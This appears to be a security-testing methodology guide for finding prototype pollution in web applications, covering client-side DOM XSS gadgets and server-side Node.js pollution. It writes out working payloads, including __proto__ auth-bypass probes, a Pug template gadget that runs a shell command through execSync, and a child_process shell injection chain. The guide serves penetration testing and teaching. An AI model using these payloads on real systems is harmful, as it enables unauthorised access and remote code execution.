# Prototype Pollution — Hunting Methodology

## What Is Prototype Pollution

Every JavaScript object inherits from `Object.prototype`. If attacker-controlled input can add properties to `Object.prototype`, those properties appear on ALL objects in the application — enabling XSS, auth bypass, denial of service, or even RCE (server-side).

Two distinct types:
- **Client-side prototype pollution** → DOM XSS, UI manipulation
- **Server-side prototype pollution (SSPP)** → RCE, auth bypass in Node.js

---

## Client-Side Prototype Pollution

### Finding Entry Points

**URL query parameters parsed by custom code:**
```
https://target.com/page?__proto__[isAdmin]=true
https://target.com/page?constructor[prototype][isAdmin]=true
```

**URL hash:**
```
https://target.com/page#__proto__[isAdmin]=true
```

**JSON body when merged shallowly:**
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

**localStorage/sessionStorage values** that get merged into config objects.

### Detection Probe

Inject into any parameter that gets parsed into an object:
```
?__proto__[testprop]=polluted
?constructor[prototype][testprop]=polluted
```

Then check in browser console:
```javascript
({}).testprop  // Should return 'polluted' if vulnerable
```

### Escalating to XSS

Look for gadgets — patterns in the app's JS code that use prototype properties as HTML sink inputs:

```javascript
// Common gadget patterns
document.write(config.targetElement || 'default')
element.innerHTML = options.template || ''
$('<div>').html(settings.content || '')
```

If `config.targetElement` gets its value from `Object.prototype.targetElement` → injecting HTML via prototype = DOM XSS.

**Tool to suggest:** [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) (Burp Suite) — automated prototype pollution gadget finder.

---

## Server-Side Prototype Pollution (SSPP) — Node.js

### Why It's Different

On the server, polluting `Object.prototype` affects ALL objects in the Node.js process. This can:
- Override security checks (`isAdmin`, `authenticated`)
- Manipulate child process options → `shell: true` → RCE
- Break JSON serialization → Denial of service

### Detection — JSON Body Injection

Send a POST/PUT with `__proto__` in JSON:
```json
{"__proto__": {"status": 444}}
```

**If the HTTP response status code changes to 444** → `Object.prototype.status` was used somewhere in the response logic → **SSPP confirmed**.

Alternative detection:
```json
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id')//x"}}
```
*(This is a Pug template engine RCE gadget — only for confirmed SSPP)*

### Safe Detection Probes

To confirm without triggering RCE:
```json
{"__proto__": {"json spaces": 10}}
```
If JSON responses suddenly become pretty-printed with large indentation → SSPP confirmed (Express/body-parser uses `json spaces`).

```json
{"__proto__": {"exposedHeaders": ["X-Custom-Polluted"]}}
```
If `X-Custom-Polluted` appears in CORS response headers → SSPP confirmed via cors package.

### SSPP → RCE Gadget Chains

Once SSPP is confirmed, look for known Node.js gadget chains:

| Package | Gadget | RCE Method |
|---|---|---|
| **child_process** | `shell: true` on `spawn()` | Inject `{"__proto__":{"shell":"/bin/bash","env":{"NODE_OPTIONS":"--require /proc/self/environ"}}}` |
| **Pug** | `outputFunctionName` | Template renders arbitrary JS |
| **EJS** | `outputFunctionName` or `settings['view options']` | Code injection in template |
| **Handlebars** | `__proto__` bypass in compiled template | Code execution |

**Tool to suggest:** [server-side-prototype-pollution](https://github.com/nicowillis/server-side-prototype-pollution) scanner, or use Burp's Backslash Powered Scanner.

---

## Impact Classification

| Scenario | Severity |
|---|---|
| Client-side → DOM XSS via gadget | High |
| SSPP confirmed (no RCE gadget found) | Medium/High |
| SSPP + RCE via known gadget chain | Critical |
| SSPP → auth bypass (`isAdmin: true`) | Critical |
| SSPP → DoS (crash Node process) | Medium |
| Client-side PP without usable gadget | Low/Informational |

## Evidence Required
- Probe input used
- Proof of pollution (console output of `({}).prop`, or JSON response change)
- For SSPP: response behavior change that confirms prototype was modified
- For RCE: `id` command output or OOB DNS
